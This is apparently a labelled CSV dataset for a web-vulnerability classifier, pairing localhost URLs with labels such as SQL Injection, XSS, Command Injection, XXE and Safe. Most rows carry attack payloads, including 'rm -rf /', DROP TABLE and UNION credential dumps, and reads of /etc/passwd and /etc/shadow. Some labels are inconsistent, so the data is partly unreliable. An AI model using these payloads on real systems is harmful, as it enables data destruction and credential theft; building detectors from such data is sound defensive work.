URL,Vulnerability Type
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/cart?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/posts?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/review?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/upload?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/invoice?run=`whoami`,Command Injection
http://127.0.0.1:5000/admin?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/file?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/download?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/search?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/invoice?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/user?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/product?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/checkout?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/search?command=| netstat -an,Command Injection
http://127.0.0.1:5000/review?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/file?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/search?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/upload?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/search?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/checkout?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/report?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/report?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/user?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/comments?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/dashboard?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/file?load=config.php,File Inclusion
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/cart?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/user?load=config.php,File Inclusion
http://127.0.0.1:5000/upload?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/profile?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/checkout?user=admin'--,SQL Injection
http://127.0.0.1:5000/search?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/product?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/comments?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/upload?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/search?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/download?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/login?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/product?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/upload?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/file?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/download?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/dashboard?user=admin'--,SQL Injection
http://127.0.0.1:5000/profile?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/dashboard?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/cart?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/search?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/comments?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/upload?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/checkout?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/order?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/report?user=admin'--,SQL Injection
http://127.0.0.1:5000/checkout?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/user?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/checkout?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/posts?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/login?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/comments?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/profile?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/download?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/report?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/report?user=admin'--,SQL Injection
http://127.0.0.1:5000/upload?load=config.php,File Inclusion
http://127.0.0.1:5000/order?path=/var/www/html/index.php,File Inclusion
"http://127.0.0.1:5000/review?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/report?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/order?login=admin' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/profile?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/user?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/user?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/file?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/settings?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/search?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/search?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/order?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/cart?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/admin?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/login?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/search?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/invoice?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/search?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/comments?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/invoice?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/settings?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/review?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/invoice?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/login?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/comments?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/review?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/cart?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/upload?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/product?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/messages?command=| netstat -an,Command Injection
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/review?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/invoice?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/login?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/posts?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/user?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/product?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/profile?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/checkout?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/product?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/product?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/search?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/review?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/messages?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/settings?load=config.php,File Inclusion
http://127.0.0.1:5000/profile?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/checkout?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/profile?load=config.php,File Inclusion
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/download?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/posts?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/invoice?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/dashboard?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/search?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/comments?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/invoice?command=| netstat -an,Command Injection
http://127.0.0.1:5000/profile?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/file?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/order?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/admin?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/profile?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/upload?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/login?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/posts?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/review?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/login?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/download?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/file?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/file?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/download?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/admin?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/product?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/report?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/cart?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/product?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/posts?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/upload?run=`whoami`,Command Injection
http://127.0.0.1:5000/settings?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/search?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/search?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/admin?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/cart?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/download?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/dashboard?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/review?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/product?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/report?load=config.php,File Inclusion
http://127.0.0.1:5000/download?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/posts?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/search?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/dashboard?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/invoice?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/file?load=config.php,File Inclusion
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/download?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/file?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/admin?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/review?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/login?exec=| cat /etc/passwd,Command Injection
http://127.0.0.1:5000/settings?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/upload?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/report?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/upload?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/upload?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/login?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/user?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/review?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/dashboard?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/admin?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/user?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/upload?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/dashboard?load=config.php,File Inclusion
http://127.0.0.1:5000/login?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/dashboard?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/checkout?search=' OR 1=1; DROP TABLE orders; --,SQL Injection
http://127.0.0.1:5000/dashboard?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/invoice?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/checkout?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/posts?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/user?run=`whoami`,Command Injection
http://127.0.0.1:5000/download?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/requests,Safe
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/product?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/settings?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/admin?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/profile?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/download?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/profile?load=config.php,File Inclusion
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/file?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/login?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/comments?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/search?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/cart?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/order?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/upload?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/posts?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/review?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/user?file_id=1001,Insecure Direct Object Reference
http://127.0.0.1:5000/file?process=&& ping -c 4 127.0.0.1,Command Injection
http://127.0.0.1:5000/settings?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/product?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/search?query=SELECT * FROM users WHERE username='admin' OR '1'='1',SQL Injection
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/,Safe
http://127.0.0.1:5000/download?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/messages?document_id=789,Insecure Direct Object Reference
http://127.0.0.1:5000/cart?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/messages?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/posts?read=../../windows/win.ini,File Inclusion
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/comments?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/cart?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/login?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/posts?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/report?target=http://internal-service.local/,Server-Side Request Forgery
http://127.0.0.1:5000/admin?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/dashboard?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/cart?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/download?link=//unsafe.com,Open Redirect
http://127.0.0.1:5000/file?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/order?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/upload?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/cart?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/checkout?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/order?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/messages?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/settings?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/upload?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/invoice?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/download?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/invoice?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/review?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/product?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/login?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/user?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/messages?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/cart?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/report?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/search?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/upload?note=<body onload=alert('XSS')>,XSS
http://127.0.0.1:5000/dashboard?q=<svg/onload=alert(1)>,XSS
http://127.0.0.1:5000/order?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/posts?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/download?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/file?msg=<img src=x onerror=alert(1)>,XSS
http://127.0.0.1:5000/settings?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/settings?logfile=log.txt,File Inclusion
http://127.0.0.1:5000/upload?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/settings?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/dashboard?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/posts?load=config.php,File Inclusion
http://127.0.0.1:5000/product?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/posts?load=config.php,File Inclusion
http://127.0.0.1:5000/order?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/search?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/report?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/comments?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/report?file=../../../../etc/passwd,File Inclusion
http://127.0.0.1:5000/invoice?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/login?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/messages?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/posts?order_id=1023,Insecure Direct Object Reference
http://127.0.0.1:5000/download?action=; rm -rf /,Command Injection
http://127.0.0.1:5000/messages?desc=<a href=javascript:alert(1)>Click</a>,XSS
http://127.0.0.1:5000/posts?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/profile?loc=../boot.ini,Directory Traversal
http://127.0.0.1:5000/checkout?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/favicon.ico,Safe
http://127.0.0.1:5000/search?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/upload?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/review?path=/var/www/html/index.php,File Inclusion
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/admin?doc=http://example.com/malicious.txt,File Inclusion
http://127.0.0.1:5000/xss,Safe
http://127.0.0.1:5000/user?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/login?xml=<?xml version='1.0' encoding='UTF-8'?><!DOCTYPE root [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>,XML External Entity
http://127.0.0.1:5000/dashboard?ref=<input onfocus=alert(1)>,XSS
http://127.0.0.1:5000/report?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/profile?input=<script>alert('XSS')</script>,XSS
http://127.0.0.1:5000/profile?path=../../../etc/passwd,Directory Traversal
http://127.0.0.1:5000/cart?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/messages?cmd=powershell Get-Process,Command Injection
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/static/styles1.css,Safe
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/upload?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/comments?password=' OR '1'='1' --,SQL Injection
http://127.0.0.1:5000/upload?fetch=http://localhost:8000/secret,Server-Side Request Forgery
"http://127.0.0.1:5000/file?input=' UNION SELECT NULL, username, password FROM users --",SQL Injection
http://127.0.0.1:5000/admin?comment=<iframe src=javascript:alert(1)>,XSS
http://127.0.0.1:5000/cart?cmd=start notepad.exe,Command Injection
http://127.0.0.1:5000/checkout?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/file?id=1' OR '1'='1,SQL Injection
http://127.0.0.1:5000/user?account_id=54321,Insecure Direct Object Reference
http://127.0.0.1:5000/login?next=//attacker.com,Open Redirect
http://127.0.0.1:5000/checkout?fetch=http://localhost:8000/secret,Server-Side Request Forgery
http://127.0.0.1:5000/upload?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/static/styles.css,Safe
http://127.0.0.1:5000/order?url=http://malicious.com,Open Redirect
http://127.0.0.1:5000/user?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/invoice?cmd=; ls -la,Command Injection
http://127.0.0.1:5000/invoice?load=config.php,File Inclusion
http://127.0.0.1:5000/messages?target=../../../../../etc/shadow,Directory Traversal
http://127.0.0.1:5000/invoice?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/order?redirect=https://phishing.com,Open Redirect
http://127.0.0.1:5000/checkout?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/download?load=config.php,File Inclusion
http://127.0.0.1:5000/order?ticket_id=2002,Insecure Direct Object Reference
http://127.0.0.1:5000/sql-injection,Safe
http://127.0.0.1:5000/comments?dir=../../../../windows/system32,Directory Traversal
http://127.0.0.1:5000/search?redirect=https://sensitive.com/data,Server-Side Request Forgery
http://127.0.0.1:5000/report?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/download?data=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://malicious.com/xxe'>]><foo>&xxe;</foo>,XML External Entity
http://127.0.0.1:5000/download?auth=') OR ('a'='a,SQL Injection
http://127.0.0.1:5000/user?user_id=1,Insecure Direct Object Reference
http://127.0.0.1:5000/admin?file=../../var/log/syslog,Directory Traversal
http://127.0.0.1:5000/upload?url=http://localhost:5000/admin,Server-Side Request Forgery
http://127.0.0.1:5000/com_inj,Safe
http://127.0.0.1:5000/file?url=http://malicious.com,Open Redirect
